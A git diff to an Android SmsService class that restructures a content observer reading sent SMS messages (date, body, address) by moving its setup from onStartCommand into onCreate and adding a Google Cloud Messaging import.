@@ -12,6 +12,7 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.util.Log;
 
+import com.google.android.gms.gcm.GoogleCloudMessaging;
 import com.google.gson.Gson;
 
 import java.util.Date;
@@ -27,7 +28,8 @@ public class SmsService extends Service {
     }
 
     @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
+    public void onCreate() {
+
         Log.i("Service", "Sms started");
         ContentResolver contentResolver = this.getContentResolver();
         final Context service = this;
@@ -36,7 +38,6 @@ public class SmsService extends Service {
             private Date _last = new Date();
             @Override
             public void onChange(boolean selfChange, Uri uri) {
-                Log.i("Service", "SMS SENT");
                 Cursor cursor = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
                 if (cursor.moveToNext()) {
                     String protocol = cursor.getString(cursor.getColumnIndex("protocol"));
@@ -45,7 +46,6 @@ public class SmsService extends Service {
                     if (protocol != null || type != 2) {
                         return;
                     }
-
                     int dateColumn = cursor.getColumnIndex("date");
                     int bodyColumn = cursor.getColumnIndex("body");
                     int addressColumn = cursor.getColumnIndex("address");
@@ -65,7 +65,10 @@ public class SmsService extends Service {
                 _last = new Date();
             }
         });
+    }
 
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
         return 0;
     }
 
